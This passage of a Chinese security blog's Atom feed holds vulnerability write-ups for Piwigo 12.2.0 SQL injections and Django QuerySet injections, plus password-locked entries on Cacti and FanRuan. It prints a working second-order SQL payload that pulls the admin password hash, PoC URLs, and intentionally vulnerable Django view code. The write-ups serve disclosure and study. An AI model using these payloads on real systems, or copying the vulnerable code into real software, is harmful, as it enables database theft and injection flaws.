99dce6d4c780b83f7bd570756c065363af1df7d76d33d6169a304723bee0fcd0dfc1f0c82f1779d5473bbc45c22027a0dc51387634e350334781e125571a9f14abc48ec772f8d5f08e3a2c8599b7e14e4ada99f858a6eadbdfd489756c7d261f7f5ff548a871e6ec05b22ae797c67a317c9ca8420f06e32b2fe1ff6af52bd196d16cfa5c8ca88032ec9f96ecc36a9b56fe3615d4ef55d65a5acf387ccb219a25b007f7c4d9f55e7bf89d6b67447f60a5d11343187ac347ef2a79425170e69920b5a2acd5975ca0a605ac97642cde33f90c077e0d52363c7c51e3ed8fea241288bb8872c0e8c0a93421643f6bc39ce763ecc0f89fecb7875087941e1ba4d8024e9a5c86589000193d787125d35e3d98f2369abda682724dccad4a6153c0925def3e43cff48ab30d504416f5cd2767a9d7c4a1bdd6a8964e38eb4c8c3ffa67012a04751832c95644a7f43490f165d90538c92310b3d8a89d0c60029a8d855049405af09d6b290cfc51822924ca59a4eeca7aa1a2b515a97eda152a92d235b63352dc58e0bb0a5c380fa32c161c2fd94783705b66379041445729eae12e08869e39b8af8178fa35c4ffeac88b751a6629f7b352e800a9624626c63cd04e0f756f649709db4c9c971aa291fa7bdf52094e81f3af272f82f19e4b1180bdc22ba520aa30ceb501a875c34899f89abbf9d69b6ff1115342dead2310f1f96e2b1a820a265691e8b38c215854570a2908788dd31ee5ac00e043b2219fe18468a9605f013e2bbb87168dcce1ecb00f60bd4bcef8b2f763199291dd35dbb2b6a798f64238049109d0c4ad0fad5683a8fcd7a314cb07a706d7112a2d8ffb025a9253409ba6f0addf3859ed9de9748f62058f914c398dc8cf53ff261cbf22447359034cc68a7f71276ff1c679df1148d0825846c5c1ace7d547a29ac969ea4a29b1d7ff36b0e58a62701f4ac5fa4e679f5014bf59ab3b40b499195c1e5a1a892e05a7ac3a90321f99d70c4cfc9cd9edc098f8d66854df6e95a4550778d232eea6dcfc24cb1e6baf3c7b06a941dec243a08c60c6b423403dab5bfbfca8049d15d9f98a51b77f9a0f6086f61a668cbd338664ddcd4abca7c6ff0ea806e19a3d1605c55972c02ea2e1ee6807fe4f4418b3edd1be6bd8d36acaba514a4345852b5e08f87c87deebb71d130a45eff2609980e069ac2b78b4e9c9cb8403c45afb645db9b4d6baaeef12d67c8a1662a9088970d75ae6273a5545a24976b953f6c1f8c6e0e9d014477f2caf87f9388db83090a8fa7fc78f511a5d0bbe6cd874b0ad3b65e4aceabb2aebb744dd711b81cfbf9ed072cbf107e2e27089fd27ed7c4e1cc6fb8f587402267ed86c304998e3bc62a8a8489fa82bf07b82387fc0275b83d92dae9c9b446306f221d4555bdc563c4ce10f76aefa59d6c2467fb47f05e5cbc51aae287180487ac3fd0bab5751038dc8f51fc59af4464b06527330422c80a3916faaf510528522bd6ac60f0d0809fab76e81c3c9acabe9aeb1f204d0b994bc8ff8a64b57774f82d150b6b874540e0745118b8fbfbfea6e5c15b03460</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章已加密, 请输入密码</summary>
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="Cacti" scheme="https://n0puple.github.io/tags/Cacti/"/>
    
    <category term="未授权漏洞" scheme="https://n0puple.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://n0puple.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>帆软反序列化RCE漏洞分析_V20220812（密码保护）</title>
    <link href="https://n0puple.github.io/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/"/>
    <id>https://n0puple.github.io/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/</id>
    <published>2022-12-02T13:30:13.000Z</published>
    <updated>2022-12-04T05:36:34.277Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="110a80bd741d91aa0934d31f0fb2224343054e3c83fb3a20d212a5771dc81d09"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章已加密, 请输入密码</summary>
    
    
    
    <category term="JAVA漏洞复现" scheme="https://n0puple.github.io/categories/JAVA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="RCE" scheme="https://n0puple.github.io/tags/RCE/"/>
    
    <category term="JAVA" scheme="https://n0puple.github.io/tags/JAVA/"/>
    
    <category term="帆软" scheme="https://n0puple.github.io/tags/%E5%B8%86%E8%BD%AF/"/>
    
    <category term="JAVA反序列化" scheme="https://n0puple.github.io/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Piwigo_12.2.0_两枚SQL注入_CVE</title>
    <link href="https://n0puple.github.io/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/"/>
    <id>https://n0puple.github.io/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/</id>
    <published>2022-11-26T12:20:32.000Z</published>
    <updated>2022-12-12T06:44:11.609Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/2030">https://forum.butian.net/share/2030</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近期与朋友一起看的两个洞，<code>Piwigo</code> 的两枚 <code>SQL</code> 注入漏洞，二次注入的漏洞挺有意思的，在这里记录一下。</p><h2 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h2><p><code>Piwigo</code> 可以通过 <code>github</code> 或者其官网下载。</p><p><code>github</code> 地址：<a href="https://github.com/Piwigo/Piwigo">https://github.com/Piwigo/Piwigo</a></p><p>官网：<a href="https://piwigo.org/">https://piwigo.org/</a></p><h2 id="0x02-CVE-2022-26266"><a href="#0x02-CVE-2022-26266" class="headerlink" title="0x02 CVE-2022-26266"></a>0x02 CVE-2022-26266</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Piwigo</code> 在 12.2.0 版本的 <code>pwg.users.php</code> 文件中发现一枚<code>SQL</code> 注入漏洞，可通过该漏洞获取数据库中的数据。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>cve</code> 官方漏洞描述中已经点出漏洞文件为 <code>pwg.users.php</code> ，我们直接看到这里，位于 <code>include/ws_functions/pwg.users.php</code></p><p>这里很多数据库操作，而且很多都是在拼接，出现注入的概率确实挺大的。</p><p>这个文件全都是函数，也就是说我们无法直接访问到这里，因此现在需要做的是找到调用的位置</p><p>第一个函数是 <code>ws_users_getList</code> ，直接全局搜索该函数</p><p><img src="image-20221117221711630.png" alt="image-20221117221711630"></p><p>在这里的 <code>ws.php</code> 中，<code>ws_users_getList</code> 被 <code>addMethod</code> 添加到 <code>$service</code> 的 <code>method</code> 列表中，实际上这里是 <code>piwigo</code> 自身定义的访问模式，这里就不细讲了，大概就是将一些路由与函数绑定在一起，当出现访问时，通过回调的方式去访问。</p><p>要想访问 <code>ws_users_getList</code> ，我们只需要访问 <code>ws.php</code> ，并 <code>get</code> 一个 <code>method</code> 参数，值为 <code>pwg.users.getList</code> 即可。</p><p>我们再回来看这个 <code>ws_users_getList</code> 的内容</p><p><img src="image-20221117224118489.png" alt="image-20221117224118489"></p><p><code>$params</code> 中存放的是我们请求的值与系统默认的一些值，看到上图，当我们的输入中带有单引号等特殊字符时，会自动转义，这是系统对输入值的过滤，不允许直接输入单双引号等危险字符。如上很多的拼接字符串都使用不了，因为他们都需要闭合前面的引号，我们只能找可以直接拼接而不用闭合引号的参数。</p><p><code>order by</code> 是常用的突破点，我们直接找到此处 208 行，并在输入中输入 <code>order</code> 参数</p><p><img src="image-20221117224722221.png" alt="image-20221117224722221"></p><p>这里我们不用闭合单引号，因此可以直接对其进行注入</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本漏洞需要登录后台利用，登录后如下点击</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">用户 -&gt; 管理 -&gt; 用户列表<br></code></pre></td></tr></table></figure><p><img src="image-20221117220404252.png" alt="image-20221117220404252"></p><p>抓包，但是放掉第一个包，进入第二个包如下</p><p><img src="image-20221117220555569.png" alt="image-20221117220555569"></p><p>这里并没有 <code>order</code> 参数，我们添加进去即可，之后发包可见报错</p><p><img src="image-20221117220751998.png" alt="image-20221117220751998"></p><p>仅验证，点到即止</p><h2 id="0x03-CVE-2022-32297"><a href="#0x03-CVE-2022-32297" class="headerlink" title="0x03 CVE-2022-32297"></a>0x03 CVE-2022-32297</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Piwigo</code> 在 12.2.0 版本的搜索功能中存在一个二次<code>SQL</code> 注入漏洞，该漏洞可以从前台获取数据库中的数据。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="数据插入部分分析"><a href="#数据插入部分分析" class="headerlink" title="数据插入部分分析"></a>数据插入部分分析</h4><p>我们先来到前台搜索处，随意搜索，然后抓包查看，这里游客身份进入即可</p><p>通过抓包，我们可以抓到处理搜索功能的文件为 <code>qsearch.php</code> ，进入后直接下断点</p><p><img src="image-20221117233046830.png" alt="image-20221117233046830"></p><p>顺利进入该文件，跟进代码，看之后经历的操作，根据网上的信息，该漏洞为二次注入漏洞，因此可以格外关注 <code>insert into</code> 的数据库操作。</p><p>从上面的图中可以看到搜索的参数为 <code>q</code> ，而在代码中也有体现</p><p><img src="image-20221117233335010.png" alt="image-20221117233335010"></p><p>这里实际上就是根据搜索的 <code>q</code> 得到 <code>search</code> 数组，序列化数组并用 <code>addslashes</code> 处理后查找，存在该搜索就更新，不存在就插入，成功插入后返回搜索的 <code>id</code> ，这里序列化操作后 <code>addslashes</code> 处理了，因此不存在直接的注入漏洞。</p><p>这里先简单说一下，其余的部分在后面写出来</p><h4 id="管理员操作部分"><a href="#管理员操作部分" class="headerlink" title="管理员操作部分"></a>管理员操作部分</h4><p>插入值后，寻找该值被使用的位置，直接可以搜索 <code>SEARCH_TABLE</code> </p><p><img src="image-20221117233902452.png" alt="image-20221117233902452"></p><p>调用的位置不多，可以一个个看，主要关注取值的位置，来到 <code>admin/history.php</code> ，根据取值的位置找到如下代码</p><p><img src="image-20221117234121204.png" alt="image-20221117234121204"></p><p>当存在<code>get</code> 的参数中存在 <code>search_id</code> 时，就会根据 <code>search_id</code> 查找 <code>rules</code> ，从上一部分的分析来看，这个 <code>rules</code> 是被序列化后的查询数据，我们也可以通过直接去看数据库内容看出来</p><p><img src="image-20221118231419112.png" alt="image-20221118231419112"></p><p>取出来的值直接反序列化，得到 <code>$page[&#39;search&#39;]</code> ，当 <code>get</code> 的参数中还存在 <code>user_id</code> 时，则会将 <code>$page[&#39;search&#39;]</code> 序列化后再次插入数据库中，但是这里的序列化数据并没有进行处理，也就是说数据里面存在单引号等就可以直接闭合，刚好这里的数据是我们可以利用第一部分的搜索操作控制的，因此造成了一个二次注入。</p><p>这里的构造需要很巧妙，既要闭合 <code>SQL</code> 操作，又要通过序列化操作，不得不说这个漏洞发现者很强，在此之前我是想不到还可以这样玩的。</p><p>这里简单说一下构造，因为 <code>insert</code> 是支持一次性插入多条数据的，通过逗号隔开即可，我们第一步的搜索语句中，插入时存在 <code>addslashes</code> ，因此插进去时是什么样子，拿出来也会是什么样子，这里一部分先闭合，随意给一个值即可，比如给一个 <code>test&#39;</code> ，此处 <code>insert</code> 只有一个字段，因此必须先闭合括号，然后开启插入的第二个数据，写一下大概就是如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span><span class="hljs-string">&#x27;),</span><br></code></pre></td></tr></table></figure><p>由于这个字段的数据都是序列化后的，因此我们必须满足序列化的规则才方便被正常取出，我们先构造一个获取管理员密码的语句如下：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> piwigo_users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用这条语句获取到密码后，再将其放入模板中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;q&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xxxx&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><code>xxxx</code> 就是我们获取到的密文，前面的4跟随密文长度变化，我看了下，这里加密方式产出的密文好像都是 34 位，因此这里直接设 34。</p><p>密码获取需要通过上面的语句获取，使用 <code>concat</code> 拼接获取，配合前面的内容得到</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">test&#x27;),((<span class="hljs-keyword">select</span> concat(<span class="hljs-string">&#x27;a:1:&#123;s:1:&quot;q&quot;;s:34:&quot;&#x27;</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> piwigo_users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;&quot;;&#125;&#x27;</span>)))#<br></code></pre></td></tr></table></figure><p>构造如上 <code>payload</code> ，通过前台搜索功能插入后，在这里就可以获取到密文，并将密文存储到数据库中</p><h4 id="访问前台获取密码"><a href="#访问前台获取密码" class="headerlink" title="访问前台获取密码"></a>访问前台获取密码</h4><p>接下来是获取该数据库内容，因此涉及的数据库仍然是刚刚的数据库，可以继续搜索 <code>SEARCH_TABLE</code> ，找到一处前台获取该数据库内容的位置，位于 <code>include/functions_search.inc.php</code></p><p><img src="image-20221121204114680.png" alt="image-20221121204114680"></p><p>这里是一个函数，直接根据 <code>$search_id</code> 搜索，然后反序列化 <code>rules</code> 后返回，我们看看调用位置</p><p><img src="image-20221121204231387.png" alt="image-20221121204231387"></p><p>定位到 <code>search_rules.php</code> </p><p><img src="image-20221121204308272.png" alt="image-20221121204308272"></p><p>比较简单就知道可以成功获取。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="将payload通过前台插入数据库"><a href="#将payload通过前台插入数据库" class="headerlink" title="将payload通过前台插入数据库"></a>将payload通过前台插入数据库</h4><p>按照之前说的注入</p><p><img src="image-20221121204807619.png" alt="image-20221121204807619"></p><p>记录返回的 <code>id</code> 值，对应插入记录的 <code>id</code></p><p>但是发现之后的利用会出错，这是为什么呢？按照前面说的，这里的 <code>q</code> 写入的是什么，之后获取就应该是那个值，但是 <code>$_GET</code> 在利用前实际上会被处理一次，位于 <code>include/common.inc.php</code> ，这是文件开头就会调用的</p><p><img src="image-20221121215142137.png" alt="image-20221121215142137"></p><p>因此我们这里写入的 <code>payload</code> 中的单引号会被加上 <code>\</code> ，就像上面图中的数据库 一样</p><p>这里的解决方法是将参数 <code>q</code> 作为一个数组写入，数组的键为 <code>payload</code> ，而 之后的处理由于是序列化，因此这个键也会被写入，之后取出来也适用。</p><p><img src="image-20221121215634944.png" alt="image-20221121215634944"></p><p>如此，进入数据库的值就不会被转义了</p><h4 id="管理员用户点击该漏洞链接"><a href="#管理员用户点击该漏洞链接" class="headerlink" title="管理员用户点击该漏洞链接"></a>管理员用户点击该漏洞链接</h4><p>此操作需要管理员权限</p><p><img src="image-20221121215728409.png" alt="image-20221121215728409"></p><p>可以看到，执行完后，会在数据库中生成两条记录，其中一条就获取到了密文</p><h4 id="攻击者前台访问获取密码"><a href="#攻击者前台访问获取密码" class="headerlink" title="攻击者前台访问获取密码"></a>攻击者前台访问获取密码</h4><p>这里唯一需要注意的一点是我们需要知道 <code>search_id</code> ，也就是插入的那条含有密文的数据的 <code>id</code> 值</p><p><img src="image-20221121220108758.png" alt="image-20221121220108758"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>相对来说，<code>CVE-2022-32297</code> 会更有意思，而且该漏洞比较难以发现，虽然需要管理员用户点击，但用户可以从前台获取到数据，比 <code>CVE-2022-26266</code> 的危害更加大。这个漏洞让我想起了 <code>Laravel</code> <code>CVE-2021-3129</code> 漏洞，同样是取出来后又放进去，从而导致了漏洞，虽然造成漏洞的本质并不一样，但有着异曲同工之妙。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/2030&quot;&gt;https://forum.butian.net/share/2030&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="Piwigo" scheme="https://n0puple.github.io/tags/Piwigo/"/>
    
    <category term="SQL注入漏洞" scheme="https://n0puple.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（下）</title>
    <link href="https://n0puple.github.io/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://n0puple.github.io/2022/10/15/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
    <published>2022-10-15T14:24:53.000Z</published>
    <updated>2022-11-04T14:33:27.560Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1962">https://forum.butian.net/share/1962</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。本篇文章是下篇。上篇请查看：<a href="https://forum.butian.net/share/1923">细数Django框架核心历史SQL注入漏洞（上）</a></p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享三个 <code>CVE</code> ，其他四个 <code>CVE</code> 在上篇文章展现。</p><ul><li>CVE-2022-28346</li><li>CVE-2022-28347</li><li>CVE-2022-34265</li></ul><h2 id="0x02-CVE-2022-28346"><a href="#0x02-CVE-2022-28346" class="headerlink" title="0x02 CVE-2022-28346"></a>0x02 CVE-2022-28346</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>annotate()</code>， <code>aggregate()</code>， <code>extra() </code>  等函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>annotate</code>  或者 <code>aggregate</code> 或 <code>extra</code> 方法</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923100805.png" alt="1"></p><p>这里给 <code>add_annotation</code> 和 <code>add_extra</code> 两个函数中的参数添加了正则过滤，接下来我们就是要找到哪里使用到了这两个函数</p><p>这里其实可以通过测试用例来进行判断，我们可以看到修复记录中也存在测试用例的修复有点多，这里只选取一个进行分析</p><p><img src="20220923101337.png" alt="2"></p><p>这里使用到了如下语句</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Author<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.aggregate</span>(**&#123;crafted_alias: <span class="hljs-built_in">Avg</span>(<span class="hljs-string">&quot;age&quot;</span>)&#125;)<br></code></pre></td></tr></table></figure><p><code>crafted_alias</code> 是用来测试的 <code>payload</code> ，我们先找到 <code>aggregate</code> 的实现位置</p><p>最终可以找到这里 <code>django\db\models\query.py</code></p><p><img src="20220923101814.png" alt="3"></p><p>传进来的 <code>args</code> 与 <code>kwargs</code>会经过 <code>_validate_values_are_expressions</code> 处理，但没有进行过滤</p><p>之后进过 <code>add_annotation</code> 进行赋值，如下</p><p><img src="20220923102244.png" alt="4"></p><p>这里就是修复 <code>sql</code> 注入的位置，对 <code>alias</code> 进行了过滤，而目前这里没有进行过滤，直接成为了 <code>self.annotations</code> 的键，之后跟进会发现这个<code>self.annotations</code> 在 <code>resolve_ref</code> 函数中被取出来</p><p><img src="20220923103209.png" alt="5"></p><p>这里会将我们之前的 <code>alias</code> 的值最终放到 <code>transform</code> 中，直接被使用</p><p>其他的漏洞函数与这个类似，就不分析了。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2020-7471</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    qs = Collection.objects.annotate(**&#123;query:Count(&quot;name&quot;)&#125;)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?q=aaaaa%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><img src="20220923105043.png" alt="6"></p><h2 id="0x03-CVE-2022-28347"><a href="#0x03-CVE-2022-28347" class="headerlink" title="0x03 CVE-2022-28347"></a>0x03 CVE-2022-28347</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>QuerySet</code> 的 <code>explain()</code>函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.28</li><li>Django 3.2.x &lt; 3.2.13</li><li>Django 4.0.x &lt; 4.0.4</li></ul><p>需要使用了 <code>explain</code>  方法，并且参数可控</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923150326.png" alt="7"></p><p>这里首先做的就是对 <code>options</code> 的内容进行过滤，如果包含敏感的字符，那么就报错，仅仅这些还没够，还做了如下更改</p><p><img src="20220923150512.png" alt="8"></p><p>这里做了一个白名单，只有在这个白名单中的字符串才可以被使用，不会直接将所有的都拼接进去</p><p>有了修复的记录，我们就很容易定位到出现问题的地方，这里 <code>django\db\models\sql\compiler.py</code>  是将代码变成 <code>sql</code> 语句，在这里有一句关于 <code>explain</code> 的处理</p><p><img src="20220923150735.png" alt="1"></p><p><code>result</code> 是一个数组，里面的字符串最后都会拼接到一起，这里调用 <code>explain_query_prefix</code> 进行处理 <code>self.query.explain_options</code> 的内容，我们这里使用 <code>postgres</code> 数据库，并且 <code>postgres</code> 对这个函数存在重写，因此这里也直接看该数据库相关的处理</p><p><code>django\db\backends\postgresql\operations.py</code></p><p> <img src="20220923151019.png" alt="1"></p><p>经过父类的处理后，在下面，会将<code>options</code> 中的每一个取出来，键直接为键，值存在就为 <code>true</code> ，因此值无法被更改，但是键会直接写入，最后拼接到 <code>prefix</code> 上去，因此这里的键存在注入。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境参考之前的 <code>CVE-2022-28346</code> ，只需要更改 <code>views.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general <span class="hljs-keyword">import</span> StringAgg<br><span class="hljs-keyword">from</span> django.db.models <span class="hljs-keyword">import</span> Count<br><br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br># <span class="hljs-keyword">Create</span> your views here.<br><br>def vuln(request):<br>    query = request.<span class="hljs-keyword">GET</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>)<br>    query = <span class="hljs-type">json</span>.loads(query)<br>    qs = Collection.objects.<span class="hljs-keyword">filter</span>(<span class="hljs-type">name</span>=&quot;tom&quot;).<span class="hljs-keyword">explain</span>(**query)<br>    <span class="hljs-keyword">return</span> HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>payload</code> 如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/vuln/?q=&#123;%<span class="hljs-number">22</span>ANALYZE%<span class="hljs-number">20</span>true)%<span class="hljs-number">22</span>:%<span class="hljs-number">22</span>aaa%<span class="hljs-number">22</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="20220923151815.png" alt="1"></p><h2 id="0x04-CVE-2022-34265"><a href="#0x04-CVE-2022-34265" 